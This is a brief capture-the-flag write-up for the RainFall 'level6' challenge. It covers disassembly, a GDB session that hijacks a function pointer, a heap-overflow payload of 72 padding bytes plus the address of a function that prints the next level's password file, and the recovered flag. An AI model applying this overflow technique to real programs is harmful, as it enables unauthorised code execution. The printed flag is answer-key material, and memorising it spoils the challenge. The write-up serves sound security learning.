# level6

## disassemble

```shell
objdump -dC -M intel level5
```

## With GDB

```shell
# [...]
# 80484d0:       ff d0                   call   eax
# [...]
# 08048454 <n>:
# [...]

(gdb) break *0x80484d0
(gdb) run x x
(gdb) print $eax
$1 = 134513768
# Hex to Dec : 08048454 --> 134513748
(gdb) set $eax=134513748
(gdb) print $eax
$2 = 134513748
(gdb) step
Single stepping until exit from function main,
which has no line number information.
/bin/cat: /home/user/level7/.pass: Permission denied
0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```

## Exploit

```shell
level6@RainFall:~$ ./level6 $(python2.7 -c 'print("B"*72)')
Segmentation fault (core dumped)
```

```shell
level6@RainFall:~$ ./level6 $(python2.7 -c 'print("B"*72) + "\x54\x84\x04\x08"')
```

## flag

```flag
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
